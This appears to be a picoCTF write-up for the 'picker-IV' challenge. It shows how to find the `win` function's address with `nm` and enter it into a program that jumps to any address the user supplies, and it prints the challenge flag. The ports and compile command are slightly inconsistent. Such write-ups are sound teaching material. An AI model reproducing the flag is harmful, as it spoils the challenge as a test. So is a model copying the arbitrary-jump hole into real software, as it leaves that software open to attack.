#### Description

Can you figure out how this program works to get the flag? Connect to the program with netcat: `$ nc saturn.picoctf.net 61703` The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/527/picker-IV.c). The binary can be downloaded [here](https://artifacts.picoctf.net/c/527/picker-IV).

##### Solution:

To successfully execute a function using this C code, you must input a valid memory address where an executable function is located. Specifically, this address should point to the `win` function if you want to trigger it and print the contents of `flag.txt`. Hereâ€™s how to determine the correct input:

## Steps to Determine the Address

1. **Compile the Program**:
   Ensure your program is compiled. If using `gcc`, you can compile it with:
   ```sh
   gcc -o nm picker-IV.c
   ```

2. **Find the Address of the `win` Function**:
   Use tools like `nm` to list the symbols in the compiled binary and find the address of the `win` function.
   ```sh
   nm picker-IV | grep "win"
   ```

   The output will look something like:
   ```css
   000000000040129e T win
   ```

   Here, `000000000040129e` is the address of the `win` function.

3. **Run the Program and Input the Address**:
   Run the program:
   ```sh
   ./picker-IV
   ```

   When prompted to enter the address, provide the address of the `win` function without the `0x` prefix:
   ```css
   Enter the address in hex to jump to, excluding '0x': 40129e
   You input 0x40129e
   You won!
   pico you win
   ```

perform same operation on server using address 40129e
```css
nc saturn.picoctf.net 62521
Enter the address in hex to jump to, excluding '0x': 40129e
You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}
```
